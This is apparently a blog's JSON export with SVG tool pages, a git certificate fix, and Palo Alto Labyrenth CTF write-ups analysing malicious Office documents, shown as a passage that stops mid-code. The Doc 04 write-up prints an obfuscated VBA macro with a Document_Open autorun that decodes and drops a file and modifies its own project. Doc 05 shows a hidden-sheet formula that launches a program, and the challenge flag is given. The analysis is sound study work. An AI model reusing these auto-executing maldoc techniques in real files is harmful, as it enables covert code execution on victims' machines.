{"meta":{"title":"Crazy Dave's InterTube Emporium","subtitle":"where stuff goes to the corner","description":null,"author":"Crazy Dave","url":"https://dbheise.github.io"},"pages":[{"title":"about","date":"2016-08-13T13:02:20.000Z","updated":"2016-08-13T17:02:20.266Z","comments":true,"path":"about/index.html","permalink":"https://dbheise.github.io/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2018-01-22T20:14:58.997Z","updated":"2016-08-13T17:03:14.520Z","comments":true,"path":"categories/index.html","permalink":"https://dbheise.github.io/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2018-01-22T20:14:59.004Z","updated":"2016-08-13T17:03:28.632Z","comments":true,"path":"tags/index.html","permalink":"https://dbheise.github.io/tags/index.html","excerpt":"","text":""},{"title":"projects","date":"2016-08-13T13:49:43.000Z","updated":"2018-01-22T21:12:52.310Z","comments":true,"path":"projects/index.html","permalink":"https://dbheise.github.io/projects/index.html","excerpt":"","text":"Document Utilities FileId OLESS Games PyramidGame Windows Tools UriHandlers WinService Html Experiments SVG Path Cleaner Random SVG Page SVG Editor"},{"title":"","date":"2018-01-23T18:46:08.936Z","updated":"2018-01-21T15:53:42.000Z","comments":true,"path":"projects/editor.html","permalink":"https://dbheise.github.io/projects/editor.html","excerpt":"","text":"Editor div { padding: 0.5%; margin: 0.5%; } label { display: block; } var edtr = document.getElementById(\"editor\") var hist = document.getElementById(\"cmdHistory\") edtr.addEventListener(\"keypress\", function (e) { if (e.code == \"Enter\") { e.preventDefault(); if (e.shiftKey) { e.target.rows++ e.target.value += \"\\n\" } else { hist.value += e.target.value + \"\\n\" e.target.rows = 1 e.target.value = \"\" } } }, { capture: true, passive: false })"},{"title":"","date":"2018-01-23T18:46:08.934Z","updated":"2018-01-02T21:11:38.000Z","comments":true,"path":"projects/svgpath.html","permalink":"https://dbheise.github.io/projects/svgpath.html","excerpt":"","text":"SVG Path Rounder div { padding: 0.5%; margin: 0.5%; } label { display: block; } .svgbox { min-width: 47%; max-width: 48%; background-color: #bbbbbb; display: inline-block; border-style: solid; border-width: 1px; } var cmdList = new Array(\"m\", \"M\", \"z\", \"Z\", \"l\", \"L\", \"h\", \"H\", \"v\", \"V\", \"c\", \"C\", \"s\", \"S\", \"q\", \"Q\", \"t\", \"T\", \"a\", \"A\", \"r\", \"R\", \"b\", \"B\") var numChars = new Array(\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \".\", \"e\", \"E\", \"+\", \"-\") var svgPath = null var result = null var oldPath = null var newPath = null document.addEventListener('DOMContentLoaded', function () { svgPath = document.getElementById(\"svgpath\") result = document.getElementById(\"result\") oldPath = document.getElementById(\"pathOrig\") newPath = document.getElementById(\"pathNew\") }) function cleararea(e) { svgPath.value = '' result.value = '' } function isCommandChar(chr) { return cmdList.indexOf(chr) > -1 } function isPartOfNumber(chr) { return numChars.indexOf(chr) > -1 } function simplify(e) { oldPath.setAttribute('d', svgPath.value) var path = Array.from(svgPath.value) var commands = new Array(); var currentCommand = \"\"; var currentDigit = \"\"; for (var i = 0; i < path.length; i++) { var c = path[i]; if (isCommandChar(c)) { commands.push(currentCommand); currentCommand = c; } else { if (isPartOfNumber(c)) { currentDigit += c; } else { if (currentDigit != \"\") { currentCommand += Math.round(Number(currentDigit)) currentDigit = \"\" } currentCommand += c; } } } if (currentDigit.length > 0) { currentCommand += Math.round(Number(currentDigit)) } commands.push(currentCommand) newPath.setAttribute('d', commands.join(' ')) result.value = commands.join('\\n') } SVG Path Simplificationatorize Clear New SVG Path Old Path New Path"},{"title":"","date":"2018-01-23T18:46:08.932Z","updated":"2018-01-03T19:32:24.000Z","comments":true,"path":"projects/randompath.html","permalink":"https://dbheise.github.io/projects/randompath.html","excerpt":"","text":"SVG Path Generator div { padding: 0.5%; margin: 0.5%; } label { display: block; font-weight: bolder; } var genPath = null var pathText = null var options = { minPoints: 2, maxPoints: 12, useInt: true, startCenter: true, minXDelta: -32, maxXDelta: 32, minYDelta: -32, maxYDelta: 32, weights: { \"MoveTo\": 0, \"LineTo\": 1, \"Horizontal LineTo\": 1, \"Vertical LineTo\": 1, \"CurveTo\": 1, \"Smooth CurveTo\": 1, \"Quadratic Bézier CurveTo\": 1, \"Smooth Quadratic Bézier CurveTo\": 1, \"Elliptical Arc\": 1, \"Close Path\": 1 } } var commandMatrix = { \"MoveTo\": { Command: \"m\", NumCoordinates: 1 }, \"LineTo\": { Command: \"l\", NumCoordinates: 2 }, \"Horizontal LineTo\": { Command: \"h\", NumCoordinates: 1 }, \"Vertical LineTo\": { Command: \"v\", NumCoordinates: 1 }, \"CurveTo\": { Command: \"c\", NumCoordinates: 6 }, \"Smooth CurveTo\": { Command: \"s\", NumCoordinates: 4 }, \"Quadratic Bézier CurveTo\": { Command: \"q\", NumCoordinates: 4 }, \"Smooth Quadratic Bézier CurveTo\": { Command: \"t\", NumCoordinates: 2 }, \"Elliptical Arc\": { Command: \"a\", NumCoordinates: 7 }, \"Close Path\": { Command: \"z\", NumCoordinates: 0 } } var weightedCommandArray = [] function updateWeights() { weightedCommandArray = [] for (var w in options.weights) { for (var i = 0; i < options.weights[w]; i++) { weightedCommandArray.push(commandMatrix[w]); } } } function randomNum(min, max) { return Math.random() * (max - min + 1) + min; } function randomInt(min, max) { return Math.floor(randomNum(min, max)); } function randomFromArray(ary) { var idx = randomInt(0, ary.length - 1); return ary[idx]; } function generateCoordinateEx(minx, maxx, miny, maxy) { if (options.useInt) return randomInt(minx, maxx) + \",\" + randomInt(miny, maxy) else return randomNum(minx, maxx) + \",\" + randomNum(miny, maxy) } function generateCoordinate() { return generateCoordinateEx(options.minXDelta, options.maxXDelta, options.minYDelta, options.maxYDelta) } function generateCoordinateList(min, max) { var ans = \"\" var countOfItems = randomInt(min, max); for (var i = 0; i < countOfItems; i++) { ans += \" \" + generateCoordinate() } return ans } function generateInitialMoveTo() { if (options.startCenter) { return \"m 250,250\" } else { return \"m \" + generateCoordinateEx(0, 500, 0, 500) } } function randomCommand(last) { var cmd //do { cmd = randomFromArray(weightedCommandArray) //} while (last != null && last.Command == cmd.Command) return cmd } function generatePath() { updateWeights() var path = generateInitialMoveTo() + \" \" var cnt = randomInt(options.minPoints, options.maxPoints) var lastCommand = commandMatrix.MoveTo for (var i = 0; i < cnt; i++) { currentCommand = randomCommand(lastCommand) if (lastCommand.Command != currentCommand.Command) { path += currentCommand.Command + \" \"; } switch (currentCommand.Command) { case \"v\": if (options.useInt) { path += randomInt(options.minYDelta, options.maxYDelta) + \" \" } else { path += randomNum(options.minYDelta, options.maxYDelta) + \" \" } break; case \"h\": if (options.useInt) { path += randomInt(options.minXDelta, options.maxXDelta) + \" \" } else { path += randomNum(options.minXDelta, options.maxXDelta) + \" \" } break; case \"a\": path += generateCoordinate() + \" \" if (options.useInt) { path += randomInt(0, 360) } else { path += randomNum(0, 360) } path += \" \" + randomFromArray([\"0\", \"1\"]) + \" \" + randomFromArray([\"0\", \"1\"]) path += generateCoordinate() + \" \" break; default: for (var n = 0; n < currentCommand.NumCoordinates; n++) { path += generateCoordinate() + \" \" } break; } lastCommand = currentCommand } return path } Path Generation Options Generate New Path Path String function go() { var newPath = generatePath() document.getElementById(\"generatedPath\").setAttribute('d', newPath) document.getElementById(\"pathtext\").value = newPath } function Option(element, data) { this.data = data this.element = element; element.value = data element.addEventListener(\"change\", this, false) } Option.prototype.handleEvent = function (event) { switch (event.type) { case \"change\": this.change(this.element.value) } } Option.prototype.change = function (value) { this.data = value this.element.value = value; options = JSON.parse(value); } var o = new Option(document.getElementById(\"options\"), JSON.stringify(options, null, 2)) document.getElementById(\"pathtext\").addEventListener(\"change\", function (event) { switch (event.type) { case \"change\": { document.getElementById(\"generatedPath\").setAttribute('d', event.target.value) } } })"}],"posts":[{"title":"HTTPS, GIT, and Enterprise certficates","slug":"HTTPS-GIT-and-Enterprise-certficates","date":"2018-05-18T12:25:23.000Z","updated":"2018-05-18T17:55:24.613Z","comments":true,"path":"2018/05/18/HTTPS-GIT-and-Enterprise-certficates/","link":"","permalink":"https://dbheise.github.io/2018/05/18/HTTPS-GIT-and-Enterprise-certficates/","excerpt":"","text":"So I was setting up my GOGS internally so my sons could have a place to push code (and so I could host my many never-completed projects) and I ran across an issue with git not liking my certificate on the HTTPS server. Its not self-signed, but it is from my internal CA. This is windows-land so its already trusted (AD CS) by the OS, but apparently not by the default git install. The specific issue was this [with some redaction]:12Cloning into &apos;&#123;PROJECT&#125;&apos;...fatal: unable to access &apos;https://&#123;SERVER&#125;/&#123;USER&#125;/&#123;PROJECT.git/&apos;: SSL certificate problem: unable to get local issuer certificate So I of course did some intertube-searching and came accross many an article about this same problem: Error: SSL certificate problem: unable to get local issuer certificate Adding a corporate (or self-signed) certificate authority to git.exe�s store Git for Windows 2.6.3 on Win10 Git ssl error on windows GIT FOR WINDOWS WITH TFS AND SSL BEHIND A PROXY Git and https / SSL The all pretty much suggested the same thing (though depending on the date of the article the exact details change), use a custom CRT file with your root cert…well guess what…IT DID NOT WORK!!! So it was mildly frustrating that everyone keeps saying to do the same thing and it will work. People were even commenting on how it worked for them…yet it doesn’t for me…HENCE THIS BLOG POST!!! After tooling around with ProcMon and watching the git executables NOT read the CRT over and over again (despite being correctly set in .gitconfig) I was leaning towards a bug in git…but just because I can blame someone else for the problem doesn’t help me solve the issue. I next went and took a look at all the different settings that were currently set in the various git config files: 1git config --list --show-origin From this I ran across the setting http.sslbackend and began to wonder what other backends were available since openssl isn’t doing the trick for me. That line of thinking lead me to this post: git not working after setting http.sslBackend config…which had this command: git config --global http.sslBackend schannel oh boy…use the windows native schannel as the SSL backend…I’m sold…and guess what…IT WORKS!!! So there you go, no mucking around with custom CRT files just use what you’ve already got setup in the windows cert stores! YMMV","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://dbheise.github.io/tags/git/"},{"name":"gogs","slug":"gogs","permalink":"https://dbheise.github.io/tags/gogs/"},{"name":"X509","slug":"X509","permalink":"https://dbheise.github.io/tags/X509/"}],"keywords":[]},{"title":"New HTML Experiments","slug":"New-HTML-Experiments","date":"2018-01-22T15:23:36.000Z","updated":"2018-01-23T20:07:55.590Z","comments":true,"path":"2018/01/22/New-HTML-Experiments/","link":"","permalink":"https://dbheise.github.io/2018/01/22/New-HTML-Experiments/","excerpt":"","text":"So I’ve recently had a few automation random ideas. The problem was that it was such a small automation and I wanted it to be useable anywhere, so I wrote it in a single HTML page and the code is in Javascript. SVG Path Cleaner - changes all the numbers in a SVG path to be decimal (i.e. rounds the number) Random SVG Page - creates a small random SVG path","categories":[],"tags":[{"name":"SVG","slug":"SVG","permalink":"https://dbheise.github.io/tags/SVG/"}],"keywords":[]},{"title":"My First ScreenSaver - an obsession in VB6","slug":"My-First-ScreenSaver-an-obsession-in-VB6","date":"2016-08-21T20:40:17.000Z","updated":"2018-01-23T18:41:16.072Z","comments":true,"path":"2016/08/21/My-First-ScreenSaver-an-obsession-in-VB6/","link":"","permalink":"https://dbheise.github.io/2016/08/21/My-First-ScreenSaver-an-obsession-in-VB6/","excerpt":"","text":"So back when I first started writing code, I was had this obsession with screen savers. I don’t really know why but I loved screen savers that were not repetitive, ones that changed over time and did something. Like any of the following: Johnny Castaway by Sierra Online - best writeup, wikipedia the After Dark series by Berkeley Systems - wikipedia SETI@home World Community Grid Various Santa Clause antic’s screen savers Various Fish Tank screen savers …and my personal favorite: Space Combat by Philip Williams but nowadays I don’t download screen savers unless I can compile from source… anyways, at one time I attempted to create my own in VB (why VB…well that’s a post in itself) based on the Space Combat screen saver, but I didn’t have fancy graphics. So I used basic sprites and freely available images found on various corners of the InterTubes: If you want to take a look you can download it, or with the VB source","categories":[],"tags":[{"name":"Labyrenth","slug":"Labyrenth","permalink":"https://dbheise.github.io/tags/Labyrenth/"},{"name":"archive","slug":"archive","permalink":"https://dbheise.github.io/tags/archive/"},{"name":"VB","slug":"VB","permalink":"https://dbheise.github.io/tags/VB/"},{"name":"ScreenSaver","slug":"ScreenSaver","permalink":"https://dbheise.github.io/tags/ScreenSaver/"}],"keywords":[]},{"title":"2016 Palo Alto Labyrenth CTF Doc 05","slug":"2016-Palo-Alto-Labyrenth-CTF-Doc-05","date":"2016-08-15T15:53:01.000Z","updated":"2016-08-16T21:44:39.346Z","comments":true,"path":"2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/","link":"","permalink":"https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-05/","excerpt":"","text":"DOC 01 DOC 02 DOC 03 DOC 04 DOC 05 &lt;- You are here Again the fifth challenge is a zip file: 01E1B7BCFB39B4A666475991AF11C5762A489F9395C48B4E156526E1C6E4573F But I have to first admit that I solved this one third, not fifth…in fact I got a message when I tried to submit the fifth challenge solution early that I had to do them in order. How did I do them out of order you ask? well remember in the very first document there was an extra .7z file inside the zip. This was a 7Zip archive that contained ALL of the challenges (go look for yourself). So running it through FileId showed only a little bit of macros:12345Sub excelulate() Application.QuitEnd Sub So I crack the file open in Microsoft Excel….hmmm its only asking for a value and a button. You click the button and it says you stink and opens calc.exe. Wait what? there’s no macro’s how is this happening? So I open the file in eDoc. What is eDoc you say? its a GUI application for looking at the streams and folders inside an Ole Structured Storage container. I don’t have a link for it as the company that produced it no longer exists, but I still have the binary…besides a very similar tool is SSView by MiTec (in fact is in many ways better…but eDoc lets me search for hex/ascii values and do inline editing). So perusing through the hex view of the Workbook stream (i.e. where the actual workbooks live) we can easily see calc.exe (around stream offset 0x5b90 as well as other places) and several other strings that were NOT on the three sheets when we opened Excel eariler….HIDDEN SHEETS. So open up excel, right click on and of the sheet names and click unhide…a little dialog opens up and we can unhide the secret sheet. But wait it looks empty. So we start looking through the formula values and eventually you will find cell A14 with this formula:1=IF(RUN(supersecret!F13)) So here you need to know excel forumlas and you will see that the notation they’re using shows there is ANOTHER hidden sheet. what? how can this be you ask? well turns out that excel has something called a VeryHidden sheet (see KB213609, or just search the InterTubes yourself) Hmmm, so how do we unhide a very hidden sheet? well just fix it in VBA. So there’s already a function excelulate so I simply changed it to: 123Sub excelulate() ActiveWorkbook.Sheets(&quot;supersecret&quot;).Visible = TrueEnd Sub and then run it! so we look at the newly discovered sheet and we find the crazy formula in F13:1=RETURN(EXACT(CONCATENATE(D7,A5,C5,B4,E20,B6,A8,B8,A12,B10,E10,C9,B13,D12,C11,B16,A25,A18,B19,C20,B21,B2,D23,B24,E4,B26,D16,A21,C14,A16),Sheet1!B3)) So I copy this into another cell in the same sheet, but modifiy at so:1=CONCATENATE(D7,A5,C5,B4,E20,B6,A8,B8,A12,B10,E10,C9,B13,D12,C11,B16,A25,A18,B19,C20,B21,B2,D23,B24,E4,B26,D16,A21,C14,A16) but wait it doesn’t run it! this sheet is showing the forumlas instead of running them. No problem, I go back to the Sheet1 sheet and pick an empty cell and enter the formula:1=supersecret!F16 and poof! we have this value:1PAN&#123;Exc3l4=3x7r3me1y4An7a5+!c&#125; we enter it into the CTF dialog BOOM completed!","categories":[],"tags":[{"name":"security","slug":"security","permalink":"https://dbheise.github.io/tags/security/"},{"name":"CTF","slug":"CTF","permalink":"https://dbheise.github.io/tags/CTF/"},{"name":"maldoc","slug":"maldoc","permalink":"https://dbheise.github.io/tags/maldoc/"},{"name":"Labyrenth","slug":"Labyrenth","permalink":"https://dbheise.github.io/tags/Labyrenth/"}],"keywords":[]},{"title":"2016 Palo Alto Labyrenth CTF Doc 04","slug":"2016-Palo-Alto-Labyrenth-CTF-Doc-04","date":"2016-08-15T15:52:58.000Z","updated":"2016-08-16T19:55:07.946Z","comments":true,"path":"2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/","link":"","permalink":"https://dbheise.github.io/2016/08/15/2016-Palo-Alto-Labyrenth-CTF-Doc-04/","excerpt":"","text":"DOC 01 DOC 02 DOC 03 DOC 04 &lt;- You are here DOC 05 Ok, so the fourth challenge is again a zip file (hash: 1A2570D5CC6E2C3A185E939DC49CB4B908B867E02AC84BF7ABB532B3395FB01A) and it contains a file fun.docm (hash: 4AE794A701D2F28BA7E6292F0463444F6A567CB7C26188A518270544252877FB). Now the first thing you need to know about the newer office file formats is that they are all zip files. So yes a DOCM and a XLSX and a PPTX, etc are all ZIP files with various contents pieces inside (see here for other zip based documents) SIDENOTE: this is one of the very reasons that I wrote my FileId tool to begin with. Most file identification apps don’t go very much beyond magic headers. If we understand that the magic header gives us a container format (i.e. Ole Structured Storage [OLESS], ZIP, and many others), then we can parse that container and gain much more information. This is exactly what FileId does it understands OLESS files and ZIP files and has some ideas what to look for inside to figure out its true file type. SIDE-SIDENOTE: Of course since its a container then we can do nasty things that were never intended to be done…like having a DOC, XLS, PPT all in a single file and all open completely different content depending on which app is opening it. ok, back to the challenge at hand and DOCM file! we can verify its a DOCM by running it through FileId or we can simply run 7zip and extract the contents…which is what I did. Since its truly a DOCM we will find a file inside the WORD subfolder named vbaProject.bin (it actually doesn’t have to be named this, but I digress). I also happen to know that this is also an OLESS file, so again we can run it through FileId, but there is a known bug in FileId here… So here we have a couple of choices as what to do next, but the underlying principle is to get to the VBA…here are several options (I did them all): use olevba.py in OleTools by Philippe Lagadec use the office object model to open and save the file in the DOC format (won’t run macro, but will maintain them) unzip the DOCM, edit the vbaProject.bin to remove the protections and alter the autorun functionname (how to do this will be covered in the DOC 05 writeup) So lets assume you did one of those, you’d get the following macro parts: =ThisDocument=123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#If VBA7 And Win64 ThenPrivate Declare PtrSafe Function jFlnz8 Lib &quot;winmm.dll&quot; Alias &quot;sndPlaySoundA&quot; _ (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long#ElsePrivate Declare Function jFlnz8 Lib &quot;winmm.dll&quot; Alias &quot;sndPlaySoundA&quot; _ (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long#End IfPublic cMSuxt As VariantPublic gkKg As ObjectPublic cN3r As StringPublic kZ4gU8sc As StringPublic qa317 As IntegerSub znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVb() Selection.WholeStory Selection.Font.ColorIndex = (Selection.Font.ColorIndex + 1) Mod 15 If Selection.Font.ColorIndex Mod 2 = 0 Then Set gkKg = CreateObject(&quot;Excel.Application&quot;) gkKg.Speech.speak NpuXrzgq.Label1, True gkKg.Quit ElseIf Selection.Font.ColorIndex Mod 2 = 1 Then adk49an = Environ(&quot;tmp&quot;) &amp; &quot;\\&quot; &amp; &quot;asdf&quot; jFlnz8 adk49an, 1 End If Application.OnTime Now + TimeValue(&quot;00:00:01&quot;), &quot;znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVb&quot;End SubPrivate Sub UxKo3LivfGHxI2OtWa3KtqOgY6cRb5yrbR00(m4dYL, fviLw9) On Error GoTo NavnYIF0: Dim fjGeMmP8Z() As Byte fjGeMmP8Z = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(m4dYL) Z1yiWeP.pZVZ0Q8ygfA6jcSJRLEKZSyv40IDQzErCpah fjGeMmP8Z, fviLw9NavnYIF0: GoTo VadXU4VadXU4:End SubPrivate Function BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz(dd) As Boolean BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz = False On Error GoTo B3A: Dim A4xcPiKtrr() As Byte A4xcPiKtrr = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(dd) BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz = Z1yiWeP.Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB(A4xcPiKtrr)B3A:End FunctionPrivate Function zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy() zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy = None For Each ok0I11 In ActiveDocument.VBProject.VBComponents l = 1 Set gjvhSFe = ok0I11.CodeModule Do While l &lt; gjvhSFe.CountOfLines za29rx = gjvhSFe.ProcOfLine(l, 0) If za29rx &lt;&gt; &quot;&quot; Then If BqNFmKCS7cTPv9XNFOd2mCLrdqCfmdNm6HBz(za29rx) Then zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy = za29rx GoTo CfHFE End If l = l + gjvhSFe.ProcCountLines(za29rx, 0) Else l = l + 1 End If Loop Next ok0I11CfHFE:End FunctionPrivate Sub XiqyXdC809pP5esSrC633ag92w0x6otQylY0() sN2l0P = zoycqKJvqznJMeMpHe7Z61xYJfLLmbObxBVy If Not IsNull(sN2l0P) Then For Each LHKwfvbUC In ActiveDocument.VBProject.VBComponents If LHKwfvbUC.Type = 1 Then HKwfvbU = 1 Set cm = LHKwfvbUC.CodeModule Do While HKwfvbU &lt; cm.CountOfLines pn = cm.ProcOfLine(HKwfvbU, 0) If pn &lt;&gt; &quot;&quot; Then UxKo3LivfGHxI2OtWa3KtqOgY6cRb5yrbR00 pn, sN2l0P HKwfvbU = HKwfvbU + cm.ProcCountLines(pn, 0) Else HKwfvbU = HKwfvbU + 1 End If Loop End If Next LHKwfvbUC End If zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8kEnd SubPrivate Function OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL(e2qBnJA1D, GNheMViA) df = Environ(&quot;tmp&quot;) &amp; &quot;\\&quot; &amp; e2qBnJA1D Dim CiuxGXWXyEUw4() As Byte CiuxGXWXyEUw4 = Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(GNheMViA) Open df For Binary Access Write As #1 Put #1, , CiuxGXWXyEUw4 Close #1 OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL = dfEnd FunctionPrivate Sub zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k() yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5 Selection.WholeStory Selection.Delete Selection.TypeText NpuXrzgq.Label1 Selection.WholeStory Selection.Font.Size = 72 znOIKcDsLlMKQVsnFfWaE2bHu18RdOmKFoVbEnd SubPrivate Sub yRQaQqmn4iZIgFxTHSbChaoJt9SxKmV7T1L5() cMSuxt = Array(OcbCTRJiqmq8ZHdtwfA1hsuje7UPUwkL1TcL(&quot;asdf&quot;, NpuXrzgq.assda)) kZ4gU8sc = NpuXrzgq.Label1End SubPublic Sub Document_Open() On Error GoTo sjjQMD: If ActiveDocument.VBProject.VBComponents.Count &gt; 4 Then XiqyXdC809pP5esSrC633ag92w0x6otQylY0 Else zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k End IfsjjQMD: If err.Number = 6068 Or err.Number = 50289 Then zkceuV405Q5LjUp587OYxTI7OR9zTyPdvz8k Else Resume Next End IfEnd Sub =Z1yiWeP=123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101Attribute VB_Name = &quot;Z1yiWeP&quot;Function d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(JwFeyAb5x, AgkWcn As Byte) As Variant Dim bzTec() As Byte ReDim bzTec(UBound(JwFeyAb5x)) For cz9vzhBR = 0 To UBound(JwFeyAb5x) bzTec(cz9vzhBR) = JwFeyAb5x(cz9vzhBR) Xor AgkWcn Next d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql = bzTecEnd FunctionPrivate Sub ir0a6FeeF0LUThieRM7v6qxfWFJD1dT6BzDH() Dim opy7ej As VBIDE.VBProject Dim PiO3rcWe As VBIDE.VBComponent Set opy7ej = ActiveDocument.VBProject Set PiO3rcWe = opy7ej.VBComponents(&quot;IadnoxRap3&quot;) opy7ej.VBComponents.Remove PiO3rcWeEnd SubFunction YhGEH9M4EBM4CJgXjOsrcHsa(u48G As Byte, G6NK) As Variant YhGEH9M4EBM4CJgXjOsrcHsa = d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(G6NK, u48G)End FunctionFunction lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo(sHZF70G) As String TPjEpV = &quot;&quot; For cz9vzhBR = 1 To UBound(sHZF70G) TPjEpV = TPjEpV &amp; StrConv(sHZF70G(cz9vzhBR), 64) Next lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo = StrConv(sHZF70G, 64)End FunctionFunction oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(Rfn10hWpA, XPbV8Rj5Q) As Boolean If UBound(Rfn10hWpA) = UBound(XPbV8Rj5Q) Then oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = True For z5PQAfu9 = 0 To UBound(Rfn10hWpA) If (Rfn10hWpA(z5PQAfu9) &lt;&gt; XPbV8Rj5Q(z5PQAfu9)) Then oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = False z5PQAfu9 = UBound(Rfn10hWpA) End If Next z5PQAfu9 Else oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR = False End IfEnd FunctionPrivate Sub DGOoR0P7MooO533jiHhTv1sgIoOtbjkzd57H() Dim yQnfle As VBIDE.VBProject Dim TQhuHj As VBIDE.VBComponent Set yQnfle = ActiveDocument.VBProject Set TQhuHj = yQnfle.VBComponents.Add(1) TQhuHj.CodeModule.InsertLines 1, lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo( _ d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(U8pblvDZuAh8GY.TextBox1 _ ), U8pblvDZuAh8GY.TextBox1.Left)) TQhuHj.Name = &quot;IadnoxRap3&quot;End SubFunction bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk(ToEZKjU, qSFa4f) As Variant Dim Qteou7() As Byte ReDim Qteou7(UBound(ToEZKjU)) For Uvhtuj = 0 To UBound(ToEZKjU) Qteou7(Uvhtuj) = ToEZKjU(Uvhtuj) Xor qSFa4f(Uvhtuj) Next bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk = Qteou7End FunctionFunction Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB(nuQXoad42c5) Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB = False Dim yTV2li() As Byte yTV2li = Z1yiWeP.d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(nuQXoad42c5, U8pblvDZuAh8GY.HelpContextId) Dim VGmMTyf() As Byte VGmMTyf = Z1yiWeP.YhGEH9M4EBM4CJgXjOsrcHsa(Int(U8pblvDZuAh8GY.ScrollHeight), yTV2li) If oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(VGmMTyf, t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(U8pblvDZuAh8GY.Label1.Caption)) Then Cj2XBWUOfIP7E9oOZKQEB0zFWe2Cf4NbfApB = True End IfEnd FunctionFunction t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(qqZUlc9) aexjT = Trim(qqZUlc9) Set vW3zM = CreateObject(StrReverse(&quot;tnemucoDMOD.2LMXSM&quot;)) Set ugBi6C = vW3zM.createElement(&quot;b64&quot;) ugBi6C.dataType = &quot;bin.base&quot; + CStr(vbUnicode) ugBi6C.Text = aexjT t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG = ugBi6C.nodeTypedValue Set ugBi6C = Nothing Set vW3zM = NothingEnd FunctionSub XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM(EZ9KcDzT, pNRoZP57xLx) Dim ang8rjzwn() As Byte ang8rjzwn = Z1yiWeP.d7KRoSK5UEDh35jJNkj0TtcJjOIbmBZlyCql(EZ9KcDzT, U8pblvDZuAh8GY.ScrollWidth) Dim upnFZMT9P() As Byte upnFZMT9P = Z1yiWeP.YhGEH9M4EBM4CJgXjOsrcHsa(U8pblvDZuAh8GY.Zoom, ang8rjzwn) Dim s06() As Byte s06 = Z1yiWeP.bSaj5R3JtfzBByy8fhXtaHSvTG2C9luMFjIk(upnFZMT9P, t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(pNRoZP57xLx)) If Z1yiWeP.oDF26uAC8jD8UVkZDlzov3c05bVN8upeerTR(s06, Z1yiWeP.t5ksdVMEuR2gVAPtbKyAxgbL2dy0UBt64qQG(StrReverse(U8pblvDZuAh8GY.Tag))) Then MsgBox Z1yiWeP.lT6fYsPEvHPdOsRZuM6Mn5DTumMvEfSGHnSo(EZ9KcDzT) End IfEnd SubSub pZVZ0Q8ygfA6jcSJRLEKZSyv40IDQzErCpah(tnfbhVCs, AjkbXE) XWn5TNdoykQb0QoitVEG7sLOxIRSi97XmqmM tnfbhVCs, AjkbXEEnd Sub so there’s a bunch of stuff…now what. Well I spent waaayyy to much time deobfuscating &amp; renaming every function to something more meaningful and useful. So I have a DOCM that is cleanedup and safe to open (i.e. no Document_Open subroutine, no passwords or anything). Get it here: 19E8BE71029D5900C54EB2213E097BC442003C1F4F5E7940B71F9902A00270FB. like I said I spent too much time going over each function, figuring out what it does and renaming it (yes I wrote some tools for this, but they’re not ready to share). If you look at the code in the clean-up document take a look at the last few functions in the `mod1’ module:123456789101112131415161718192021222324252627282930313233Sub fnCheck(fnB64Arry, customKey) Dim tmp1() As Byte tmp1 = mod1.fnSimpleXor(fnB64Arry, frm2.ScrollWidth) Dim tmp2() As Byte tmp2 = mod1.fnSimpleXor_wrapper(frm2.Zoom, tmp1) Dim tmp3() As Byte tmp3 = mod1.fnCustomXor(tmp2, fnToBase64Ary(customKey)) Dim a1 As String: a1 = mod1.toString(fnB64Arry) 